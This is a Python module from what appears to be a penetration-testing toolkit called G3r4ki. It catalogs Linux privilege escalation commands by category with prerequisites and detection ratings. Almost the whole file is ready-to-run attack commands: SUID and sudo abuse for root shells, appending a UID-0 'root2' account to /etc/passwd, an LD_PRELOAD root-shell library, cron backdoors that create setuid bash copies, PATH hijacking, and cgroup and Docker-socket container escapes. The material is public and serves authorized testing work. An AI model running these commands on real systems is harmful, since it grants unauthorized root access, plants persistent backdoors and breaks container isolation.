"""
G3r4ki Linux Privilege Escalation Module

This module provides a collection of Linux privilege escalation techniques,
organized by category and with detailed descriptions of how they work.
"""

import os
import re
import stat
import logging
import subprocess
from typing import Dict, List, Any, Optional, Tuple, Union, Callable

# Setup logging
logger = logging.getLogger('g3r4ki.pentest.privesc.linux')

class LinuxPrivilegeEscalation:
    """
    Linux privilege escalation techniques for penetration testing.
    
    This class provides methods to exploit various privilege escalation vectors
    on Linux systems, organized by category.
    """
    
    def __init__(self, verbose: bool = False):
        """
        Initialize the Linux privilege escalation module.
        
        Args:
            verbose: Whether to enable verbose logging
        """
        self.verbose = verbose
        
        # Initialize technique categories
        self.techniques = {
            'suid_binaries': {},
            'capabilities': {},
            'sudo_misconfigurations': {},
            'cron_jobs': {},
            'path_hijacking': {},
            'kernel_exploits': {},
            'container_escapes': {},
            'service_exploits': {},
            'password_reuse': {},
            'miscellaneous': {},
        }
        
        # Load all techniques
        self._initialize_techniques()
    
    def _initialize_techniques(self):
        """Initialize all privilege escalation techniques."""
        self._initialize_suid_techniques()
        self._initialize_capability_techniques()
        self._initialize_sudo_techniques()
        self._initialize_cron_techniques()
        self._initialize_path_hijacking_techniques()
        self._initialize_kernel_techniques()
        self._initialize_container_escape_techniques()
    
    def _initialize_suid_techniques(self):
        """Initialize SUID binary exploitation techniques."""
        self.techniques['suid_binaries'] = {
            'find': {
                'name': 'find SUID Exploitation',
                'description': 'Use SUID find to run commands as root',
                'command': 'find / -exec /bin/sh -p \\; -quit',
                'prerequisites': ['find must be SUID root'],
                'detection_evasion': 'Low - Easily detected in logs',
                'references': ['https://gtfobins.github.io/gtfobins/find/']
            },
            'bash': {
                'name': 'bash SUID Exploitation',
                'description': 'Use SUID bash to get a root shell',
                'command': 'bash -p',
                'prerequisites': ['bash must be SUID root'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://gtfobins.github.io/gtfobins/bash/']
            },
            'nano': {
                'name': 'nano SUID Exploitation',
                'description': 'Use SUID nano to read/write files as root',
                'command': 'nano /etc/shadow',
                'prerequisites': ['nano must be SUID root'],
                'detection_evasion': 'Low - Easily detected in logs',
                'references': ['https://gtfobins.github.io/gtfobins/nano/']
            },
            'cp': {
                'name': 'cp SUID Exploitation',
                'description': 'Use SUID cp to copy arbitrary files',
                'command': 'cp /etc/passwd /tmp/passwd && echo "root2:x:0:0:root:/root:/bin/bash" >> /tmp/passwd && cp /tmp/passwd /etc/passwd',
                'prerequisites': ['cp must be SUID root'],
                'detection_evasion': 'Low - File modifications are logged',
                'references': ['https://gtfobins.github.io/gtfobins/cp/']
            },
            'python': {
                'name': 'python SUID Exploitation',
                'description': 'Use SUID python to get a root shell',
                'command': 'python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
                'prerequisites': ['python must be SUID root'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://gtfobins.github.io/gtfobins/python/']
            },
            'perl': {
                'name': 'perl SUID Exploitation',
                'description': 'Use SUID perl to get a root shell',
                'command': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'',
                'prerequisites': ['perl must be SUID root'],
                'detection_evasion': 'Medium - Can be detected in process lists', 
                'references': ['https://gtfobins.github.io/gtfobins/perl/']
            },
            'nmap': {
                'name': 'nmap SUID Exploitation',
                'description': 'Use SUID nmap to get a root shell (old versions)',
                'command': 'nmap --interactive\nnmap> !sh',
                'prerequisites': ['nmap must be SUID root', 'Must be using an older version of nmap with --interactive'],
                'detection_evasion': 'Low - Easily detected in logs',
                'references': ['https://gtfobins.github.io/gtfobins/nmap/']
            },
            'vim': {
                'name': 'vim SUID Exploitation',
                'description': 'Use SUID vim to get a root shell',
                'command': 'vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
                'prerequisites': ['vim must be SUID root'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://gtfobins.github.io/gtfobins/vim/']
            },
            'less': {
                'name': 'less SUID Exploitation',
                'description': 'Use SUID less to get a root shell',
                'command': 'less /etc/profile\n!/bin/sh',
                'prerequisites': ['less must be SUID root'],
                'detection_evasion': 'Low - Easily detected in logs',
                'references': ['https://gtfobins.github.io/gtfobins/less/']
            },
            'more': {
                'name': 'more SUID Exploitation',
                'description': 'Use SUID more to get a root shell',
                'command': 'more /etc/profile\n!/bin/sh',
                'prerequisites': ['more must be SUID root'],
                'detection_evasion': 'Low - Easily detected in logs',
                'references': ['https://gtfobins.github.io/gtfobins/more/']
            },
            'awk': {
                'name': 'awk SUID Exploitation',
                'description': 'Use SUID awk to get a root shell',
                'command': 'awk \'BEGIN {system("/bin/sh")}\'',
                'prerequisites': ['awk must be SUID root'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://gtfobins.github.io/gtfobins/awk/']
            }
        }
    
    def _initialize_capability_techniques(self):
        """Initialize capability exploitation techniques."""
        self.techniques['capabilities'] = {
            'python_cap_setuid': {
                'name': 'Python cap_setuid Exploitation',
                'description': 'Use Python with cap_setuid capability to get a root shell',
                'command': 'python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
                'prerequisites': ['python must have cap_setuid capability'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            },
            'perl_cap_setuid': {
                'name': 'Perl cap_setuid Exploitation',
                'description': 'Use Perl with cap_setuid capability to get a root shell',
                'command': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'',
                'prerequisites': ['perl must have cap_setuid capability'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            },
            'ruby_cap_setuid': {
                'name': 'Ruby cap_setuid Exploitation',
                'description': 'Use Ruby with cap_setuid capability to get a root shell',
                'command': 'ruby -e \'Process::Sys.setuid(0); exec "/bin/bash"\'',
                'prerequisites': ['ruby must have cap_setuid capability'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            },
            'node_cap_setuid': {
                'name': 'Node.js cap_setuid Exploitation',
                'description': 'Use Node.js with cap_setuid capability to get a root shell',
                'command': 'node -e \'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]});\'',
                'prerequisites': ['node must have cap_setuid capability'],
                'detection_evasion': 'Medium - Can be detected in process lists',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            },
            'gdb_cap_ptrace': {
                'name': 'GDB cap_ptrace Exploitation',
                'description': 'Use GDB with cap_ptrace capability to attach to processes',
                'command': 'gdb -p 1\n(gdb) call system("sh")',
                'prerequisites': ['gdb must have cap_ptrace capability'],
                'detection_evasion': 'Low - Process attachment is logged',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            },
            'tcpdump_cap_net_admin': {
                'name': 'tcpdump cap_net_admin Exploitation',
                'description': 'Use tcpdump with cap_net_admin capability to sniff network traffic',
                'command': 'tcpdump -i any -w /tmp/capture.pcap',
                'prerequisites': ['tcpdump must have cap_net_admin capability'],
                'detection_evasion': 'Medium - Packet captures may be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities']
            }
        }
    
    def _initialize_sudo_techniques(self):
        """Initialize sudo misconfiguration exploitation techniques."""
        self.techniques['sudo_misconfigurations'] = {
            'sudo_all': {
                'name': 'Sudo ALL Exploitation',
                'description': 'Use sudo ALL permission to get a root shell',
                'command': 'sudo su -',
                'prerequisites': ['User must have ALL sudo permissions'],
                'detection_evasion': 'Low - Sudo access is logged',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo-and-suid']
            },
            'sudo_vim': {
                'name': 'Sudo vim Exploitation',
                'description': 'Use sudo vim to get a root shell',
                'command': 'sudo vim -c \':!/bin/bash\'',
                'prerequisites': ['User must have sudo permission for vim'],
                'detection_evasion': 'Medium - Suspicious vim commands might be detected',
                'references': ['https://gtfobins.github.io/gtfobins/vim/']
            },
            'sudo_nano': {
                'name': 'Sudo nano Exploitation',
                'description': 'Use sudo nano to read/write protected files',
                'command': 'sudo nano /etc/shadow',
                'prerequisites': ['User must have sudo permission for nano'],
                'detection_evasion': 'Low - File access is logged',
                'references': ['https://gtfobins.github.io/gtfobins/nano/']
            },
            'sudo_less': {
                'name': 'Sudo less Exploitation',
                'description': 'Use sudo less to get a root shell',
                'command': 'sudo less /etc/profile\n!/bin/bash',
                'prerequisites': ['User must have sudo permission for less'],
                'detection_evasion': 'Medium - Suspicious less commands might be detected',
                'references': ['https://gtfobins.github.io/gtfobins/less/']
            },
            'sudo_more': {
                'name': 'Sudo more Exploitation',
                'description': 'Use sudo more to get a root shell',
                'command': 'sudo more /etc/profile\n!/bin/bash',
                'prerequisites': ['User must have sudo permission for more'],
                'detection_evasion': 'Medium - Suspicious more commands might be detected',
                'references': ['https://gtfobins.github.io/gtfobins/more/']
            },
            'sudo_man': {
                'name': 'Sudo man Exploitation',
                'description': 'Use sudo man to get a root shell',
                'command': 'sudo man man\n!/bin/bash',
                'prerequisites': ['User must have sudo permission for man'],
                'detection_evasion': 'Medium - Suspicious man commands might be detected',
                'references': ['https://gtfobins.github.io/gtfobins/man/']
            },
            'sudo_python': {
                'name': 'Sudo python Exploitation',
                'description': 'Use sudo python to get a root shell',
                'command': 'sudo python -c \'import os; os.system("/bin/bash")\'',
                'prerequisites': ['User must have sudo permission for python'],
                'detection_evasion': 'Medium - Python execution is logged',
                'references': ['https://gtfobins.github.io/gtfobins/python/']
            },
            'sudo_perl': {
                'name': 'Sudo perl Exploitation',
                'description': 'Use sudo perl to get a root shell',
                'command': 'sudo perl -e \'exec "/bin/bash";\'',
                'prerequisites': ['User must have sudo permission for perl'],
                'detection_evasion': 'Medium - Perl execution is logged',
                'references': ['https://gtfobins.github.io/gtfobins/perl/']
            },
            'sudo_ruby': {
                'name': 'Sudo ruby Exploitation',
                'description': 'Use sudo ruby to get a root shell',
                'command': 'sudo ruby -e \'exec "/bin/bash"\'',
                'prerequisites': ['User must have sudo permission for ruby'],
                'detection_evasion': 'Medium - Ruby execution is logged',
                'references': ['https://gtfobins.github.io/gtfobins/ruby/']
            },
            'sudo_awk': {
                'name': 'Sudo awk Exploitation',
                'description': 'Use sudo awk to get a root shell',
                'command': 'sudo awk \'BEGIN {system("/bin/bash")}\'',
                'prerequisites': ['User must have sudo permission for awk'],
                'detection_evasion': 'Medium - Awk execution is logged',
                'references': ['https://gtfobins.github.io/gtfobins/awk/']
            },
            'sudo_find': {
                'name': 'Sudo find Exploitation',
                'description': 'Use sudo find to get a root shell',
                'command': 'sudo find / -exec /bin/bash \\;',
                'prerequisites': ['User must have sudo permission for find'],
                'detection_evasion': 'Low - Find execution with exec is logged',
                'references': ['https://gtfobins.github.io/gtfobins/find/']
            },
            'sudo_nmap': {
                'name': 'Sudo nmap Exploitation',
                'description': 'Use sudo nmap to get a root shell (older versions)',
                'command': 'sudo nmap --interactive\nnmap> !sh',
                'prerequisites': ['User must have sudo permission for nmap', 'Must be using an older version of nmap with --interactive'],
                'detection_evasion': 'Low - Nmap interactive mode is logged',
                'references': ['https://gtfobins.github.io/gtfobins/nmap/']
            },
            'sudo_env_keep': {
                'name': 'Sudo LD_PRELOAD Exploitation',
                'description': 'Use sudo with LD_PRELOAD to get a root shell',
                'command': 'echo \'#include <stdio.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\nvoid _init() {\\n    unsetenv("LD_PRELOAD");\\n    setresuid(0,0,0);\\n    system("/bin/bash -p");\\n}\' > /tmp/preload.c\ngcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c\nsudo LD_PRELOAD=/tmp/preload.so find',
                'prerequisites': ['Sudo must have the env_keep option set for LD_PRELOAD', 'User must have sudo permission for at least one command'],
                'detection_evasion': 'Low - Preloading libraries with sudo is suspicious',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo-and-suid']
            }
        }
    
    def _initialize_cron_techniques(self):
        """Initialize cron job exploitation techniques."""
        self.techniques['cron_jobs'] = {
            'writable_cron_script': {
                'name': 'Writable Cron Script Exploitation',
                'description': 'Modify a writable script that is run by a cron job',
                'command': 'echo "#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash" > /path/to/writable/cron/script',
                'prerequisites': ['Must have write permission to a script run by a cron job as root'],
                'detection_evasion': 'Low - File modifications may be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/scheduled-cron-jobs']
            },
            'writable_cron_dir': {
                'name': 'Writable Cron Directory Exploitation',
                'description': 'Create or modify a script in a writable cron directory',
                'command': 'echo "#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash" > /etc/cron.d/backdoor\\nchmod +x /etc/cron.d/backdoor',
                'prerequisites': ['Must have write permission to a cron directory'],
                'detection_evasion': 'Low - New cron jobs may be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/scheduled-cron-jobs']
            },
            'cron_wildcards': {
                'name': 'Cron Wildcards Exploitation',
                'description': 'Exploit wildcards in cron job commands',
                'command': 'echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /home/user/runme.sh\\ntouch "/home/user/--checkpoint=1"\\ntouch "/home/user/--checkpoint-action=exec=sh\\ runme.sh"',
                'prerequisites': ['Cron job must use a wildcard with a command like tar, rsync, etc.'],
                'detection_evasion': 'Medium - Unusual filenames might be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/scheduled-cron-jobs']
            },
            'cron_file_overwrite': {
                'name': 'Cron File Overwrite Exploitation',
                'description': 'Overwrite a file used by a cron job',
                'command': 'echo "#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash" > /path/to/overwritable/file',
                'prerequisites': ['Must have write permission to a file used by a cron job as root'],
                'detection_evasion': 'Low - File modifications may be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/scheduled-cron-jobs']
            },
            'cron_symlink': {
                'name': 'Cron Symlink Exploitation',
                'description': 'Create a symlink to redirect a cron job',
                'command': 'ln -sf /path/to/your/malicious/script /path/to/original/cron/script',
                'prerequisites': ['Must have write permission to the directory of a script run by a cron job as root'],
                'detection_evasion': 'Medium - Symlinks might be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/scheduled-cron-jobs']
            }
        }
    
    def _initialize_path_hijacking_techniques(self):
        """Initialize PATH hijacking techniques."""
        self.techniques['path_hijacking'] = {
            'path_hijack_basic': {
                'name': 'Basic PATH Hijacking',
                'description': 'Create a malicious binary in a writable directory in PATH',
                'command': 'echo \'#!/bin/bash\\n/bin/bash\' > /tmp/service\\nchmod +x /tmp/service\\nexport PATH=/tmp:$PATH',
                'prerequisites': ['Must have write permission to a directory in PATH or ability to modify PATH'],
                'detection_evasion': 'Medium - Suspicious PATH modifications might be detected',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/path-hijacking']
            },
            'path_hijack_suid': {
                'name': 'SUID Binary PATH Hijacking',
                'description': 'Exploit a SUID binary that calls commands without full path',
                'command': 'echo \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash\\nchmod +s /tmp/rootbash\' > /tmp/service\\nchmod +x /tmp/service\\nexport PATH=/tmp:$PATH',
                'prerequisites': ['SUID binary must call a command without specifying the full path'],
                'detection_evasion': 'Low - SUID binary execution is usually logged',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/path-hijacking']
            },
            'path_hijack_sudo': {
                'name': 'Sudo Binary PATH Hijacking',
                'description': 'Exploit a sudo binary that calls commands without full path',
                'command': 'echo \'#!/bin/bash\\n/bin/bash\' > /tmp/service\\nchmod +x /tmp/service\\nsudo PATH=/tmp:$PATH /path/to/vulnerable/sudo/binary',
                'prerequisites': ['Sudo binary must call a command without specifying the full path', 'Sudo must allow PATH to be preserved or set'],
                'detection_evasion': 'Low - Sudo access is logged',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/path-hijacking']
            },
            'path_hijack_script': {
                'name': 'Script PATH Hijacking',
                'description': 'Exploit a script that calls commands without full path',
                'command': 'echo \'#!/bin/bash\\n/bin/bash\' > /tmp/command\\nchmod +x /tmp/command\\nexport PATH=/tmp:$PATH',
                'prerequisites': ['Script must run as root and call a command without specifying the full path'],
                'detection_evasion': 'Medium - Depends on script execution monitoring',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/path-hijacking']
            }
        }
    
    def _initialize_kernel_techniques(self):
        """Initialize kernel exploitation techniques."""
        self.techniques['kernel_exploits'] = {
            'dirty_cow': {
                'name': 'Dirty COW (CVE-2016-5195)',
                'description': 'Exploit a race condition in the Linux kernel memory subsystem',
                'command': 'See reference for exploit code',
                'prerequisites': ['Kernel version < 4.8.3'],
                'detection_evasion': 'Low - Exploit is easily detected',
                'references': ['https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs']
            },
            'overlayfs': {
                'name': 'OverlayFS (CVE-2015-1328)',
                'description': 'Exploit a vulnerability in the OverlayFS implementation',
                'command': 'See reference for exploit code',
                'prerequisites': ['Kernel version 3.13.0 < 3.19.0'],
                'detection_evasion': 'Low - Exploit is easily detected',
                'references': ['https://www.exploit-db.com/exploits/37292']
            },
            'mempodipper': {
                'name': 'Mempodipper (CVE-2012-0056)',
                'description': 'Exploit a vulnerability in the Linux kernel memory management',
                'command': 'See reference for exploit code',
                'prerequisites': ['Kernel version < 2.6.39'],
                'detection_evasion': 'Low - Exploit is easily detected',
                'references': ['https://www.exploit-db.com/exploits/18411']
            },
            'meltdown': {
                'name': 'Meltdown (CVE-2017-5754)',
                'description': 'Exploit a vulnerability in modern processors',
                'command': 'See reference for exploit code',
                'prerequisites': ['Kernel without PTI patches'],
                'detection_evasion': 'Medium - Exploit is more complex to detect',
                'references': ['https://meltdownattack.com/']
            }
        }
    
    def _initialize_container_escape_techniques(self):
        """Initialize container escape techniques."""
        self.techniques['container_escapes'] = {
            'docker_socket': {
                'name': 'Docker Socket Exploitation',
                'description': 'Escape a container using exposed Docker socket',
                'command': 'docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash',
                'prerequisites': ['Docker socket must be mounted inside the container'],
                'detection_evasion': 'Low - Container creation is logged',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security']
            },
            'privileged_container': {
                'name': 'Privileged Container Escape',
                'description': 'Escape from a privileged container',
                'command': 'mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x\n'
                           'echo 1 > /tmp/cgrp/x/notify_on_release\n'
                           'host_path=`sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab`\n'
                           'echo "$host_path/cmd" > /tmp/cgrp/release_agent\n'
                           'echo \'#!/bin/sh\\nps > $host_path/output\' > /cmd\n'
                           'chmod a+x /cmd\n'
                           'sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"\n',
                'prerequisites': ['Container must be running in privileged mode'],
                'detection_evasion': 'Low - Cgroup manipulation is suspicious',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security']
            },
            'mounted_hostpath': {
                'name': 'Host Path Mount Exploitation',
                'description': 'Exploit a host path mounted inside the container',
                'command': 'Depends on the specific host path mounted',
                'prerequisites': ['Host path must be mounted inside the container'],
                'detection_evasion': 'Medium - Depends on what actions are taken',
                'references': ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security']
            },
            'cap_sys_admin': {
                'name': 'CAP_SYS_ADMIN Exploitation',
                'description': 'Escape a container using CAP_SYS_ADMIN capability',
                'command': 'mkdir /tmp/exploit\n'
                           'mount -t proc proc /tmp/exploit\n'
                           'mkdir -p /tmp/exploit/w\n'
                           'echo "#!/bin/bash\\n/bin/bash" > /tmp/exploit/w/payload\n'
                           'chmod +x /tmp/exploit/w/payload\n'
                           'cd /tmp/exploit\n'
                           'echo 1 > w/notify_on_release\n'
                           'echo "\\$\\$" > w/cgroup.procs\n'
                           'mount -t overlay overlay -o rw,lowerdir=/sys/fs/cgroup,upperdir=w,workdir=w /sys/fs/cgroup\n'
                           'touch /sys/fs/cgroup/release_agent\n'
                           'echo "/tmp/exploit/w/payload" > /sys/fs/cgroup/release_agent\n'
                           'echo 0 > /sys/fs/cgroup/w/cgroup.procs',
                'prerequisites': ['Container must have CAP_SYS_ADMIN capability'],
                'detection_evasion': 'Low - Cgroup manipulation is suspicious',
                'references': ['https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/']
            }
        }
    
    def get_technique(self, category: str, technique_id: str) -> Dict[str, str]:
        """
        Get details about a specific privilege escalation technique.
        
        Args:
            category: Technique category (e.g., 'suid_binaries', 'sudo_misconfigurations')
            technique_id: Specific technique ID
            
        Returns:
            Technique details or empty dict if not found
        """
        if category not in self.techniques:
            logger.warning(f"Unknown technique category: {category}")
            return {}
        
        if technique_id not in self.techniques[category]:
            logger.warning(f"Unknown technique ID: {technique_id} in category {category}")
            return {}
        
        return self.techniques[category][technique_id]
    
    def list_techniques(self, category: str = None) -> Dict[str, Dict[str, str]]:
        """
        List available privilege escalation techniques.
        
        Args:
            category: Optional category to filter by
            
        Returns:
            Dictionary of techniques
        """
        if category:
            if category not in self.techniques:
                logger.warning(f"Unknown technique category: {category}")
                return {}
            
            return self.techniques[category]
        
        # Return all techniques organized by category
        return self.techniques
    
    def get_technique_count(self) -> Dict[str, int]:
        """
        Get count of techniques in each category.
        
        Returns:
            Dictionary with count of techniques per category
        """
        counts = {}
        for category, techniques in self.techniques.items():
            counts[category] = len(techniques)
        
        return counts
    
    def generate_report(self, format_type: str = 'text') -> str:
        """
        Generate a report of available privilege escalation techniques.
        
        Args:
            format_type: Report format (text, json, html)
            
        Returns:
            Formatted report
        """
        if format_type == 'json':
            import json
            return json.dumps(self.techniques, indent=2)
        
        # Text report (default)
        report = []
        report.append("=" * 50)
        report.append("G3r4ki Linux Privilege Escalation Techniques")
        report.append("=" * 50)
        
        for category, techniques in self.techniques.items():
            if techniques:  # Only include non-empty categories
                # Format category name
                category_name = category.replace('_', ' ').title()
                report.append(f"\n[+] {category_name} ({len(techniques)} techniques)")
                report.append("-" * 50)
                
                for technique_id, details in techniques.items():
                    report.append(f"  Technique: {details.get('name', technique_id)}")
                    report.append(f"  Description: {details.get('description', 'No description available')}")
                    report.append(f"  Command: {details.get('command', 'No command available')}")
                    
                    # Prerequisites
                    prereqs = details.get('prerequisites', [])
                    if prereqs:
                        report.append("  Prerequisites:")
                        for prereq in prereqs:
                            report.append(f"    - {prereq}")
                    
                    # Detection evasion
                    evasion = details.get('detection_evasion', 'Unknown')
                    report.append(f"  Detection Evasion: {evasion}")
                    
                    # References
                    refs = details.get('references', [])
                    if refs:
                        report.append("  References:")
                        for ref in refs:
                            report.append(f"    - {ref}")
                    
                    report.append("")
        
        return "\n".join(report)


# Make privesc techniques easily available
linux_privesc = LinuxPrivilegeEscalation()

# Make common functions available at module level
get_technique = linux_privesc.get_technique
list_techniques = linux_privesc.list_techniques
generate_report = linux_privesc.generate_report